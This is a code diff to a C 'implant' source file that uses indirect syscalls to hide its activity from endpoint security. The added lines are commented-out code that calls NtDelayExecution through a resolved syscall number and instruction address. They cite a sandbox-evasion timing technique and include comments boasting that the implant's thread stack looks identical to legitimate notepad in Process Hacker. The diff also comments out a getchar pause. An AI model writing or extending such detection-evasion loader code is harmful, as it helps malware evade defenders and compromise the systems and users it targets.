@@ -70,6 +70,15 @@ EXTERN_C NTSTATUS NtWaitForSingleObject(
 	IN PLARGE_INTEGER Timeout
 );
 
+/*
+// Code: https://evasions.checkpoint.com/techniques/timing.html
+EXTERN_C NTSTATUS NtDelayExecution(
+	IN BOOLEAN              Alertable,
+	IN PLARGE_INTEGER       DelayInterval
+);
+*/
+
+
 // Declare global variables to hold syscall numbers and syscall instruction addresses
 EXTERN_C VOID GetSyscall(WORD SSN);
 EXTERN_C VOID GetSyscallAddr(INT_PTR syscallAddr);
@@ -339,6 +348,46 @@ int main()
 
 	// ============================= End: NtCreateThreadEx() ====================================
 
+	// Just Uncomment this and compile -> Execute and open the implant process in process hacker -> check thread Stack -> It's totally Legit 
+	// 
+	// 1. Top of the stack will indeed show ntoskrnl.exe as 
+	// => ProcessHacker has a Driver inbuilt which will see beyond the call to ntdll and into ntoskrnl (kernel)
+	// 
+	// 2. Compared with legit notepad, stack looks identical 
+	//		i. => Nt functions are present at the top of the Stack (Leaving, the "ntoskrnl.exe is on TOP of CallStack" factor)
+	// 
+	//		ii. => Nt functions are retrieved from ntdll itself, NOT from implant process 
+
+	/*
+	LARGE_INTEGER SleepUntil;
+	//LARGE_INTEGER SleepTo;
+
+	const char NtDelay[] = { 'N','t','D','e','l','a','y','E','x','e','c','u','t','i','o','n', 0 };
+
+	LPVOID pNtDelay = GetProcAddress(GetModuleHandleA(ntdll), NtDelay);
+
+	syscallNum = SortSSN(pNtDelay);
+	syscallAddress = GetsyscallInstr(pNtDelay);
+
+	// Indirect Syscall
+	GetSyscall(syscallNum);
+	GetSyscallAddr(syscallAddress);
+
+	DWORD ms = 10000;
+
+	// Code: https://evasions.checkpoint.com/techniques/timing.html
+	GetSystemTimeAsFileTime((LPFILETIME)&SleepUntil);
+	SleepUntil.QuadPart += (ms * 10000);
+
+	NTSTATUS NTDelaystatus = NtDelayExecution(TRUE, &SleepUntil);
+
+	if (!NT_SUCCESS(NTDelaystatus))
+	{
+		printf("[!] Failed in NtDelayExecution (%u)\n", GetLastError());
+		return 1;
+	}
+	*/
+
 	// ============================== NtWaitForSingleObject() ====================================
 
 	LARGE_INTEGER Timeout;
@@ -361,9 +410,11 @@ int main()
 		return 1;
 	}
 
-	getchar();
+	//getchar();
 
 	// ============================== End: NtWaitForSingleObject() =================================
+
+	// ==============================
 
 	return 0;
 }
